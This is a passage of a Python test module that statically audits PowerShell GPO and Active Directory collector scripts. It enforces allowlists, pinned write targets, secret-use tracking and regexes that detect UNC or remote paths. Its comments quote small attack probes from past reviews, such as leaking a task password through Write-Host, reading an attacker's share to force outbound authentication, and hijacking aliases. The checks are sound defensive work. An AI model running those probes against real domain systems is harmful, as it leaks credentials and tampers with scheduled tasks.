    assert result.returncode == 0, result.stderr
    return json.loads(result.stdout)


def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
    return {Path(e["path"]).name: _canonicalize(e) for e in _run_dumper_raw(exe, paths)}


@cache
def _inventory_for(exe: str) -> dict[str, dict[str, Any]]:
    return _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])


@pytest.fixture(scope="module")
def inventory() -> dict[str, dict[str, Any]]:
    return _inventory_for(_pwsh())


def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> None:
    unexpected = sorted(used - allowed)
    unused = sorted(allowed - used)
    assert not unexpected, f"{script}: {kind} outside the read-only allowlist: {unexpected}"
    assert not unused, f"{script}: stale {kind} allowlist entries (remove them): {unused}"


# ---------------------------------------------------------------------------
# Check functions. Each raises AssertionError on a violation. The per-script
# tests below call them against the real scripts; the regression suite calls
# run_all_checks against modified copies and asserts a failure.
# ---------------------------------------------------------------------------


def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
    policy = POLICIES[script]
    named = {c["name"] for c in entry["commands"] if c["name"]}
    _exact("commands", script, named - _cfset(local), _cfset(policy.commands))
    dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
    _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
    # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
    # string the assignment AST cannot see; none are used, so forbid them.
    assert not entry["indirect_writes"], (
        f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
    )
    forbidden = sorted(named & _cfset(FORBIDDEN_COMMANDS))
    assert not forbidden, f"{script}: commands that are never allowed: {forbidden}"
    # A parameter token that binds to no real parameter of a known cmdlet (nor a
    # common parameter) errors at runtime; refuse it rather than treat it as
    # inert (DeepSeek round-5 NB-3: `Get-ChildItem -OutFile ...`).
    for command in entry["commands"]:
        if not command.get("cmdlet_known"):
            continue
        for arg in command["arguments"]:
            if arg["parameter"] and not arg.get("parameter_resolved", True):
                raise AssertionError(
                    f"{script}:{command['line']}: -{arg['parameter']} is not a parameter of "
                    f"{command['name']}"
                )
    # ForEach-Object may only run scriptblocks: `ForEach-Object Delete` /
    # `-MemberName Delete` invokes a method by name, invisible to the member
    # allowlist.
    for command in entry["commands"]:
        if command["name"] not in ("foreach-object", "%", "foreach"):
            continue
        for arg in command["arguments"]:
            param = arg["parameter"]
            if param is None:
                ok = arg["value_kind"] == "ScriptBlockExpressionAst"
            else:
                resolved = _resolve_param(
                    str(param), ["Begin", "Process", "End", "RemainingScripts"]
                )
                ok = resolved is not None and arg["value_kind"] == "ScriptBlockExpressionAst"
            assert ok, (
                f"{script}:{command['line']}: ForEach-Object must be given scriptblocks only "
                f"({_norm(command['text'])})"
            )


def check_dotnet(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    members = entry["members"]
    dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
    assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
    static = {_method_key(m["type"], m["member"]) for m in members if m["static"]}
    allowed_static = frozenset(_method_key(*k.split("::")) for k in policy.static_methods)
    _exact("static .NET methods", script, static, allowed_static)
    instance = {m["member"] for m in members if not m["static"]}
    _exact("instance .NET methods", script, instance, _cfset(policy.instance_methods))
    assigned = {a["target"] for a in entry["member_assignments"]}
    _exact("property assignments", script, assigned, policy.member_assignments)


def check_types(script: str, entry: dict[str, Any]) -> None:
    refs = list(entry["type_references"])
    for assignment in entry["member_assignments"]:
        refs += assignment.get("receiver_types", [])
    hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
    assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"


def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
    allowed = {_cf(k): v for k, v in INSTANCE_RECEIVERS.get(script, {}).items()}
    side_effecting = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
    for member in entry["members"]:
        if member["static"]:
            continue
        name = member["member"]
        receiver_var = member["receiver_var"]
        if receiver_var is None:
            # No pinnable receiver variable. A side-effecting method on a
            # parenthesized/command result ((Get-Item x).Delete(), FileInfo
            # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
            # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
            # screened any type-literal receiver).
            assert name not in side_effecting, (
                f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
                f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
            )
            continue
        permitted = allowed.get(name, frozenset())
        assert receiver_var in permitted, (
            f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
            f"${receiver_var} (allowed: {sorted(permitted)})"
        )


def _is_variable_param(arg: dict[str, Any]) -> bool:
    canon = arg.get("parameter_canonical")
    if canon:
        return _cf(canon) in _VARIABLE_WRITING_CANON
    return _cf(str(arg["parameter"])).endswith("variable")


# A variable-writing common parameter must name its target as a plain literal
# identifier (optionally `+` for append). A computed name (`('Output'+'Root')`,
# `$n`, `${OutputRoot}`) cannot be pinned, so it is refused (DeepSeek NEW-BL-3,
# NON-BL-2).
_LITERAL_VARIABLE_NAME = re.compile(r"^\+?[A-Za-z_][A-Za-z0-9_]*$")


def _common_param_writes(entry: dict[str, Any]) -> list[dict[str, Any]]:
    """Every -OutVariable/-ErrorVariable/... use: line, parameter, target, literal.

    These bind a variable with no assignment AST node (Sol BL-1). ``literal`` is
    true only for a bare identifier argument; ``target`` is the variable name it
    writes (``+`` stripped) or the raw text when it is not literal.
    """
    writes: list[dict[str, Any]] = []
    for command in entry["commands"]:
        for arg in command["arguments"]:
            if arg["parameter"] and _is_variable_param(arg):
                raw = _norm(arg["value"])
                literal = arg["value_kind"] == "StringConstantExpressionAst" and bool(
                    _LITERAL_VARIABLE_NAME.match(raw)
                )
                writes.append(
                    {
                        "line": command["line"],
                        "function": command["function"],
                        "parameter": str(arg["parameter"]),
                        "target": raw.lstrip("+") if literal else raw,
                        "literal": literal,
                    }
                )
    return writes


def check_usings(script: str, entry: dict[str, Any]) -> None:
    assert not entry["using_statements"], (
        f"{script}: `using` statements are not allowed "
        f"(assembly/module/namespace load): {[u['text'] for u in entry['using_statements']]}"
    )


def check_redirections(script: str, entry: dict[str, Any]) -> None:
    for redir in entry["redirections"]:
        if redir["kind"] == "merging":
            continue  # stream merge (e.g. *>&1); writes no file
        assert _norm(redir["location"]) == "$null", (
            f"{script}:{redir['line']}: file redirection must target $null, "
            f"not {redir['location']!r}"
        )


def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    types: set[str] = set()
    assemblies: set[str] = set()
    definitions: set[str] = set()
    for command in entry["commands"]:
        bound = command["bound"]
        if command["name"] == "new-object":
            assert "comobject" not in bound, f"{script}:{command['line']}: COM is not allowed"
            types.add(_cf(str(bound.get("typename"))))
        elif command["name"] == "add-type":
            keys = set(bound) - {"erroraction"}
            if keys == {"assemblyname"}:
                assemblies.add(_cf(bound["assemblyname"]))
            elif keys == {"typedefinition"} and command["type_definition_sha256"]:
                definitions.add(command["type_definition_sha256"])
            else:
                # AssertionError (not pytest.fail) so _run_checks and the
                # generator report it as a check failure (Sol round-4 NB-3).
                raise AssertionError(
                    f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}"
                )
    _exact("New-Object types", script, types, _cfset(policy.new_object_types))
    _exact("Add-Type assemblies", script, assemblies, _cfset(policy.add_type_assemblies))
    _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)


def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
    targets: list[tuple[int, str]] = []
    for command in entry["commands"]:
        name = command["name"] or ""
        required = _WRITE_COMMANDS_CF.get(name)
        optional = _OPTIONAL_PATH_COMMANDS_CF.get(name)
        params = required or optional
        if params is None:
            continue
        bound = [command["bound"][p] for p in params if isinstance(command["bound"].get(p), str)]
        if not bound:
            if optional is not None:
                continue
            raise AssertionError(
                f"line {command['line']}: cannot resolve the write target of {command['text']}"
            )
        targets.extend((command["line"], text) for text in bound)
    for member in entry["members"]:
        if member["static"] and _method_key(member["type"], member["member"]) in _WRITE_STATIC_CF:
            targets.append((member["line"], member["first_argument"] or ""))
    return targets


def check_writes(script: str, entry: dict[str, Any]) -> None:
    roots = set(WRITE_ROOTS[script])
    assert roots <= set(PINNED_VARS[script]), (
        f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
    )
    pinned_targets = WRITE_TARGET_EXPRESSIONS[script]
    used: set[str] = set()
    for line, text in _write_targets(entry):
        norm = _norm(text)
        # Closed set: the write target must be exactly one of the pinned path
        # expressions. This refuses `Join-Path $root $childData`, a `$env:` or
        # `..` component, and any computed child (Sol BL-4); the anchoring root
        # is separately pinned (check_pinned_bindings).
        assert norm in pinned_targets, (
            f"{script}:{line}: write target {norm!r} is not a pinned path expression"
        )
        assert not _ABSOLUTE_LITERAL.search(norm), f"{script}:{line}: absolute/UNC/.. in {norm!r}"
        assert not _PROVIDER.search(norm), f"{script}:{line}: provider path in {norm!r}"
        used.add(norm)
    # New-Item must not create links, target a provider, or carry a -Name
    # component (another path segment, Sol BL-4), -Value or -Target path.
    for command in entry["commands"]:
        if command["name"] != "new-item":
            continue
        bound = command["bound"]
        item_type = _cf(str(bound.get("itemtype", "")))
        assert item_type not in _FORBIDDEN_ITEM_TYPES, (
            f"{script}:{command['line']}: New-Item -ItemType {bound.get('itemtype')} is not allowed"
        )
        assert "psprovider" not in bound, (
            f"{script}:{command['line']}: New-Item -PSProvider blocked"
        )
        assert "name" not in bound, (
            f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
        )
        for key in ("value", "target"):
            value = bound.get(key)
            if isinstance(value, str):
                assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                    f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                )
    _exact("write-target expressions", script, used, pinned_targets)


def check_pinned_bindings(script: str, inv: dict[str, dict[str, Any]]) -> None:
    """Every required variable (write roots, receivers, splats, exec/task inputs,
    and transitively everything their bindings read) is pinned, and each pinned
    variable's complete binding set equals the committed set exactly.

    A binding is any way the variable acquires a value (see the binding-key
    legend above), so a receiver rebind (`$entry = Get-Item <SYSVOL>`, Sol
    round-3 BL-2), a call-site argument to a local function's root parameter
    (`Write-GpoLensOwnerMarkerBytes -OutputRoot <SYSVOL>`), a `[ref]`, a `++`, a
    property/index write on a pinned object, or a variable-writing common
    parameter all change the set and fail.
    """
    pinned = PINNED_VARS[script]
    required = _required_vars(script, inv)
    unpinned = sorted(set(required) - set(pinned))
    assert not unpinned, f"{script}: variables must be pinned: " + "; ".join(
        f"${v} ({required[v]})" for v in unpinned
    )
    stale = sorted(set(pinned) - set(required))
    assert not stale, f"{script}: PINNED_VARS entries no longer required (remove them): {stale}"
    bindings = _all_bindings(script, inv)
    for var in sorted(pinned):
        actual = bindings.get(var, set())
        allowed = pinned[var]
        extra = sorted(actual - allowed)
        missing = sorted(allowed - actual)
        assert not extra, (
            f"{script}: ${var} has undocumented binding(s) {extra} "
            "(a confined write/exec/receiver variable cannot be rebound)"
        )
        assert not missing, f"{script}: stale pinned binding(s) for ${var}: {missing}"
        for key in actual:
            if key.startswith("foreach "):
                assert not _ABSOLUTE_LITERAL.search(key) and not _PROVIDER.search(key), (
                    f"{script}: foreach source for pinned ${var} carries an absolute/UNC/provider "
                    f"path: {key!r}"
                )
            elif key.startswith("param "):
                assert not _UNC_OR_DOTDOT.search(key) and not _PROVIDER.search(key), (
                    f"{script}: ${var} parameter default is an unsafe path: {key!r}"
                )
    _, unresolved = _call_site_bindings(script, inv)
    assert not unresolved, f"{script}: call-site arguments that bind no parameter: {unresolved}"


def check_bindings(script: str, entry: dict[str, Any]) -> None:
    """Assignment forms that cannot be pinned, or that rebind the engine.

    Refuses: a provider/drive or `$global:` assignment target (Sol round-3
    `${Alias:Get-Item} = 'Remove-Item'`, `$env:PSModulePath`, `${C:\\x}`); any
    write to an automatic/preference variable outside SPECIAL_BINDINGS; any
    reference to $PSDefaultParameterValues/$PSModuleAutoLoadingPreference/
    $ExecutionContext (DeepSeek NEW-BL-1); an index write outside
    INDEX_ASSIGNMENT_ROOTS; multiple assignment and other unpinnable left-hand
    sides; a drive-qualified variable read other than `$env:`; and a computed or
    unlisted variable-writing common-parameter target (DeepSeek NEW-BL-3).
    """
    others = [a["target"] for a in entry["other_assignments"]]
    assert not others, f"{script}: unpinnable assignment targets: {others}"
    specials: set[tuple[str, str]] = set()
    for binding in entry["variable_assignments"]:
        name = binding["name"]
        where = f"{script}:{binding['line']}"
        assert binding["is_variable"] and binding["qualifier"] in _ALLOWED_QUALIFIERS, (
            f"{where}: ${name} is a provider/drive or global-scope write ({binding['kind']})"
        )
        assert binding["kind"] != "multi", f"{where}: multiple assignment to ${name} is not allowed"
        bare = _bare_var(name)
        if bare == "null" and binding["kind"] == "assign" and binding["operator"] == "Equals":
            continue  # `$null = expr` discards output
        if bare in _SPECIAL_VARIABLES or bare.endswith("preference"):
            specials.add((bare, _binding_key(binding)))
    unexpected = sorted(specials - SPECIAL_BINDINGS[script])
    assert not unexpected, (
        f"{script}: writes to automatic/preference variables are not allowed: {unexpected}"
    )
    _exact("automatic/preference variable writes", script, specials, SPECIAL_BINDINGS[script])
    for ref in entry["variable_refs"]:
        bare = _bare_var(ref["name"])
        assert bare not in FORBIDDEN_VARIABLE_REFS, (
            f"{script}: ${ref['name']} may not be referenced"
        )
        assert ref["drive"] in ("", "env"), (
            f"{script}: provider-qualified variable ${{{ref['name']}}} is not allowed"
        )
    roots = {_cf(i["root_var"] or "") for i in entry["index_assignments"]}
    unexpected_roots = sorted(roots - INDEX_ASSIGNMENT_ROOTS[script])
    assert not unexpected_roots, (
        f"{script}: index writes on {unexpected_roots} are not allowed "
        f"({[i['target'] for i in entry['index_assignments']]})"
    )
    _exact("index-write roots", script, roots, INDEX_ASSIGNMENT_ROOTS[script])
    targets: set[str] = set()
    for write in _common_param_writes(entry):
        assert write["literal"], (
            f"{script}:{write['line']}: -{write['parameter']} target {write['target']!r} must be a "
            "literal variable name (a computed name cannot be pinned)"
        )
        targets.add(_bare_var(write["target"]))
    _exact(
        "variable-writing common-parameter targets", script, targets, COMMON_PARAM_TARGETS[script]
    )


def check_ast(script: str, entry: dict[str, Any]) -> None:
    """Whole-tree screens: every node type serializable and in the closed set;
    no `#Requires` (module auto-import, Sol round-3 BL-1); no background jobs or
    parallel foreach; ASCII source (Windows PowerShell 5.1 reads a BOM-less file
    as ANSI, so non-ASCII bytes could parse differently there than here)."""
    assert not entry["unsupported_nodes"], (
        f"{script}: AST nodes the serializer does not cover: {entry['unsupported_nodes']}"
    )
    extra = sorted(set(entry["node_types"]) - ALLOWED_NODE_TYPES)
    assert not extra, f"{script}: AST node types outside the closed set: {extra}"
    assert not entry["script_requirements"], f"{script}: #Requires is not allowed"
    assert not entry["background_pipelines"], (
        f"{script}: background jobs (`&`) are not allowed: {entry['background_pipelines']}"
    )
    for row in entry["ast_rows"]:
        if row[2] == "ForEachStatementAst":
            flags = dict(row[3]).get("Flags", "None")
            assert flags == "None", f"{script}: foreach -Parallel is not allowed"
    assert entry["source_non_ascii_bytes"] == 0, (
        f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
    )
    # LF only (.gitattributes pins it): the golden digests exact bytes, and a CR
    # inside a multi-line literal would change that literal's value (Sol r4 NB-2).
    assert entry["source_cr_bytes"] == 0, (
        f"{script}: source has {entry['source_cr_bytes']} CR bytes (LF line endings only)"
    )


def check_local_functions(script: str, entry: dict[str, Any]) -> None:
    names = list(entry["functions"])
    assert len(names) == len(set(names)), f"{script}: a function is defined twice"
    expected = [_cf(n) for n in LOCAL_FUNCTIONS[script]]
    assert names == expected, (
        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS {expected}"
    )


def _function_body_digest(fn: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in fn["body_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_local_function_bodies(script: str, entry: dict[str, Any]) -> None:
    """Every local function's whole normalized syntax tree is pinned by digest
    in LOCAL_FUNCTION_BODIES (hand-maintained; the generator never writes it).

    The dataflow pins see a helper's call expression, not what it returns or
    does: Sol round 4 changed Get-GpoLensCompletedExports to emit an outside-
    root FileInfo (into a pinned Remove-Item via the catch path) and
    ConvertTo-GpoLensTaskArgument to return a constant UNC `-File` target, with
    every pin unchanged. Any edit to a function body now needs a reviewed
    digest update here.
    """
    actual = {fn["name"]: _function_body_digest(fn) for fn in entry["function_params"]}
    allowed = {_cf(k): v for k, v in LOCAL_FUNCTION_BODIES[script].items()}
    changed = sorted(n for n in actual if n in allowed and actual[n] != allowed[n])
    assert not changed, (
        f"{script}: function bodies changed (review, then update LOCAL_FUNCTION_BODIES): "
        + ", ".join(f"{n} -> {actual[n]}" for n in changed)
    )
    _exact("pinned function bodies", script, set(actual), frozenset(allowed))


# EVERY command invocation (Sol round 5: extra calls of allowlisted read/output
# commands — `Write-Host "captured=$taskPassword"`, `Get-Item \\host\share\...` —
# were unpinned), plus every write/exec/lifetime .NET call, is pinned with its
# exact normalized text AND control-flow context (enclosing functions,
# conditions, loops, try/catch/finally, scriptblock arguments, and every
# preceding guard — an `if` that throws/returns, an `Assert-*` call, an exit
# statement) as a multiset. A new or duplicated call, a call moved outside its
# guard (Sol round-3 Unregister copy, round-4 NB-1 marker write), a guard moved
# after an operation, or a weakened guard condition changes the multiset.
# (Inside local functions the body digest pins the same calls again.)
_GUARDED_STATIC = frozenset(
    _method_key(*k.split("::"))
    for k in _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
)
_GUARDED_INSTANCE = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)


def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
    entry = inv[script]
    ops: list[tuple[str, tuple[str, ...]]] = []
    for command in entry["commands"]:
        ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
    for member in entry["members"]:
        if member["static"]:
            if _method_key(member["type"], member["member"]) not in _GUARDED_STATIC:
                continue
        elif member["member"] not in _GUARDED_INSTANCE:
            continue
        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
    return ops


def check_guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> None:
    from collections import Counter

    actual = Counter(_guarded_ops(script, inv))
    allowed = Counter(GUARDED_OPS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: command invocations, write/exec operations or their guards changed.\n"
        + "".join(f"  unexpected: {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(extra))
        + "".join(f"  missing:    {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(missing))
    )


# Secret-bearing variables (Sol round 5): the service-account credential and the
# plaintext password extracted from it, plus anything assigned from them.
SECRET_VARIABLES: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(),
    "Export-GroupMembers.ps1": frozenset({"credential"}),
    "Export-Principals.ps1": frozenset({"credential"}),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({"credential", "taskpassword"}),
}
_ASSIGNED_ROOT = re.compile(
    r"^\$(?:script:|local:|private:)?([A-Za-z_][A-Za-z0-9_]*)[^=]*?(?:\+)?=(?!=)"
)


def _secret_variables(script: str, entry: dict[str, Any]) -> set[str]:
    """Seeds plus every variable a statement reading a secret assigns to
    (`$taskPassword = $Credential...`, `$adParams.Credential = $Credential`)."""
    secrets = set(SECRET_VARIABLES[script])
    changed = True
    while changed:
        changed = False
        for use in entry["variable_uses"]:
            if use["name"] not in secrets:
                continue
            match = _ASSIGNED_ROOT.match(use["statement"])
            if match and _cf(match.group(1)) not in secrets:
                secrets.add(_cf(match.group(1)))
                changed = True
    return secrets


def _secret_uses(script: str, entry: dict[str, Any]) -> list[tuple[str, str, str]]:
    secrets = _secret_variables(script, entry)
    return [
        (u["name"], u["function"], u["statement"])
        for u in entry["variable_uses"]
        if u["name"] in secrets
    ]


def check_secret_uses(script: str, entry: dict[str, Any]) -> None:
    """Every read or write of a secret-bearing variable is one of the committed
    uses (declaration, validation, GetNetworkCredential() extraction, the single
    Register-ScheduledTask -Password site, splatting into the AD reads, and
    clearing). Interpolation into a message, an argument to any other command,
    a pipeline, a member access or a copy to another variable is a new use and
    is refused."""
    from collections import Counter

    actual = Counter(_secret_uses(script, entry))
    allowed = Counter(SECRET_USES[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: secret-variable uses changed.\n"
        + "".join(f"  unexpected: ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(extra))
        + "".join(f"  missing:    ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(missing))
    )


# A UNC / remote path (`\\host\share`, `//host/share`, `\\?\UNC\...`) in any
# command argument: a read of an attacker-addressed share also forces outbound
# authentication from the DC (Sol round 5). None are used; refuse all.
_REMOTE_PATH = re.compile(r"""(?:^|['"(\s])(?:\\\\|//)[^\\/\s'"]""")


def check_remote_paths(script: str, entry: dict[str, Any]) -> None:
    for command in entry["commands"]:
        for arg in command["arguments"]:
            value = arg["value"] or ""
            assert not _REMOTE_PATH.search(value), (
                f"{script}:{command['line']}: remote/UNC path in a command argument: {value!r}"
            )


# Remote-looking string literals anywhere in a script (UNC `\\host\share`,
# `//host/share`, `\\?\UNC\...`, device paths, URLs `scheme://`): a variable
# bound to one reaches commands whose text is pinned (Sol round 6). Only these
# exact literal values may occur (casefolded script -> values, with reasons).
_REMOTE_LITERAL = re.compile(r"(?:^|[\s'\"(,;=])(?:\\\\|//)\S|\b[A-Za-z][A-Za-z0-9+.-]+://")
REMOTE_LITERALS: dict[str, frozenset[str]] = {
    # The collector's one deliberate remote read: the domain's own SYSVOL
    # Policies share, built from the domain's DNS root (read-only copy source).
    "Export-GpoEstate.ps1": frozenset({"\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    # A regex (double trailing backslashes in ConvertTo-GpoLensTaskArgument), not a path.
    "Register-GpoLensCollection.ps1": frozenset({"(\\\\+)$"}),
}


def _string_literals(entry: dict[str, Any]) -> list[str]:
    values: list[str] = []
    for row in entry["ast_rows"]:
        if row[2] in ("StringConstantExpressionAst", "ExpandableStringExpressionAst"):
            value = dict(row[3]).get("Value")
            if isinstance(value, str):
                values.append(value)
    return values


def check_remote_literals(script: str, entry: dict[str, Any]) -> None:
    found = {v for v in _string_literals(entry) if _REMOTE_LITERAL.search(v)}
    unexpected = sorted(found - REMOTE_LITERALS[script])
    assert not unexpected, f"{script}: remote/UNC/URL-looking string literals: {unexpected}"
    _exact("remote-looking literals", script, found, REMOTE_LITERALS[script])


# Every TaskName parameter of the task scripts carries this validator, so a
# wildcard (`*`, `?`, `[...]`), path or quote character can never reach
# Unregister-/Register-ScheduledTask (Sol round 5: `-TaskName '*' -Unregister`
# removed every matching task).
TASK_NAME_VALIDATOR = "[ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]"
_TASK_NAME_SCRIPTS = ("Register-GpoLensCollection.ps1", "Run-GpoLensCollection.ps1")


def check_task_name_validator(script: str, entry: dict[str, Any]) -> None:
    if script not in _TASK_NAME_SCRIPTS:
        return
    decls = [d for d in entry["parameter_decls"] if d["name"] == "taskname"]
    assert decls, f"{script}: no TaskName parameter found"
    for decl in decls:
        assert TASK_NAME_VALIDATOR in decl["attributes"], (
            f"{script}: TaskName parameter of {decl['function'] or 'the script'} lacks "
            f"{TASK_NAME_VALIDATOR}: {decl['attributes']}"
        )


def _header_digest(entry: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in entry["header_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_script_header(script: str, entry: dict[str, Any]) -> None:
    """The script's own attributes and param block ([CmdletBinding(Supports-
    ShouldProcess)], parameters, validators, defaults) are pinned by a hand-
    maintained digest: turning ShouldProcess off (Sol round 5) or dropping a
    validator is a reviewed edit."""
    actual = _header_digest(entry)
    assert actual == SCRIPT_HEADERS[script], (
        f"{script}: script attributes/param block changed (review, then update "
        f"SCRIPT_HEADERS): {actual}"
    )


def _arg_vector(command: dict[str, Any]) -> TaskVector:
    return frozenset(
        (
            _cf(str(a.get("parameter_canonical") or a["parameter"])),
            _norm(a["value"]) if a["value"] is not None else None,
        )
        for a in command["arguments"]
        if a["parameter"]
    )


def check_task_action(script: str, entry: dict[str, Any]) -> None:
    if script != _TASK_ACTION_SCRIPT:
        for command in entry["commands"]:
            assert command["name"] not in _TASK_VECTORS_CF, (
                f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
            )
        return
    for command in entry["commands"]:
        vectors = _TASK_VECTORS_CF.get(command["name"] or "")
        if vectors is None:
            continue
        # The full argument vector must match one pinned vector exactly. An
        # extra -CimSession, a wildcard -TaskName, -RunLevel Highest, or any
        # other changed/added argument matches none and fails.
        actual = _arg_vector(command)
        assert actual in vectors, (
            f"{script}:{command['line']}: {command['name']} argument vector {sorted(actual)} "
            f"matches no pinned vector"
        )


# Named semantic checks, in run order. Each takes (script, entry); the two that
# also need the local function set are wrapped. The names are what the
# regression suite asserts against (NON-BL-3).
def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {
        "ast": check_ast,
        "commands": lambda s, e: check_commands(s, e, local),
        "local_functions": check_local_functions,
        "local_function_bodies": check_local_function_bodies,
        "dotnet": check_dotnet,
        "types": check_types,
        "instance_receivers": check_instance_receivers,
        "usings": check_usings,
        "redirections": check_redirections,
        "new_object_and_add_type": check_new_object_and_add_type,
        "writes": check_writes,
        "bindings": check_bindings,
        "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
        "task_action": check_task_action,
        "guarded_ops": lambda s, e: check_guarded_ops(s, inv),
        "secret_uses": check_secret_uses,
        "remote_paths": check_remote_paths,
        "remote_literals": check_remote_literals,
        "task_name_validator": check_task_name_validator,
        "script_header": check_script_header,
    }


def _run_checks(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
    """Run every semantic check; return the set of check names that raised.

    ``parse_errors`` is reported as the pseudo-check ``parse`` so the regression
    suite can require a *substantive* check (not a parse failure) to flag a probe.
    """
    policy = POLICIES[script]
    entry = inv[script]
    local = set(entry["functions"])
    for source in policy.dot_sources:
        local |= set(inv[source]["functions"])
    failed: set[str] = set()
    if entry["parse_errors"]:
        failed.add("parse")
    for check_name, fn in _named_checks(local, inv).items():
        try:
            fn(script, entry)
        except AssertionError:
            failed.add(check_name)
    return failed


def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
    entry = inv[script]
    assert entry["parse_errors"] == [], f"{script}: {entry['parse_errors']}"
    failed = {c for c in _run_checks(script, inv) if c != "parse"}
    assert not failed, f"{script}: checks failed: {sorted(failed)}"


# ---------------------------------------------------------------------------
# Closed-world golden inventory. For each in-scope script the committed file
# records (1) ``ast``: a canonical, order-preserving serialization of the WHOLE
# syntax tree — one line per node, pre-order, indented by depth, naming the
# property the node fills in its parent and every semantically relevant scalar
# (operators, names, string values, flags, #Requires, attributes, ...); and
# (2) ``source_sha256``: a digest of the exact source bytes (LF line endings are
# pinned by .gitattributes and CR is refused by check_ast), so comments and
# whitespace (which the AST omits but a script can observe, e.g. via a
# scriptblock's text) are covered too. Any change to a
# collector therefore changes the inventory and fails
# test_inventory_matches_golden until it is regenerated by
# scripts/gen_collector_inventory.py, which refuses unless every semantic check
# above passes.
# ---------------------------------------------------------------------------

GOLDEN_PATH = _REPO / "tests" / "powershell" / "collector-inventory.json"


def _ast_line(row: list[Any]) -> str:
    depth, role, kind, attrs = row[0], row[1], row[2], row[3]
    text = "  " * int(depth) + f"{role}: {kind}"
    for key, value in attrs:
        text += f" {key}={json.dumps(value, ensure_ascii=True)}"
    if len(row) > 4:  # an UNSUPPORTED node also carries its source text
        text += f" text={json.dumps(row[4], ensure_ascii=True)}"
    return text


def _canonical(entry: dict[str, Any]) -> dict[str, Any]:
    return {
        "source_sha256": entry["source_sha256"],
        "parse_errors": entry["parse_errors"],
        "ast": [_ast_line(row) for row in entry["ast_rows"]],
    }


def build_full_inventory(inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {script: _canonical(inv[script]) for script in sorted(POLICIES)}


def _dump_golden(golden: dict[str, Any]) -> str:
    return json.dumps(golden, indent=1, sort_keys=True, ensure_ascii=True) + "\n"


def write_golden_inventory(exe: str) -> dict[str, Any]:
    """Build, semantically validate, and write the golden inventory.

    The generator refuses to write unless every semantic check passes for every
    script. That is the regeneration floor: it can only admit what the semantic
    layer admits, and the resulting golden diff is what a reviewer inspects.
    """
    inv = _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])
    for script in POLICIES:
        run_all_checks(script, inv)
    golden = build_full_inventory(inv)
    GOLDEN_PATH.write_text(_dump_golden(golden), encoding="utf-8")
    return golden


def test_inventory_matches_golden(inventory: dict[str, dict[str, Any]]) -> None:
    assert GOLDEN_PATH.exists(), (
        "tests/powershell/collector-inventory.json is missing; "
        "run `python scripts/gen_collector_inventory.py`"
    )
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    current = build_full_inventory(inventory)
    if committed != current:
        import difflib

        diff = "\n".join(
            list(
                difflib.unified_diff(
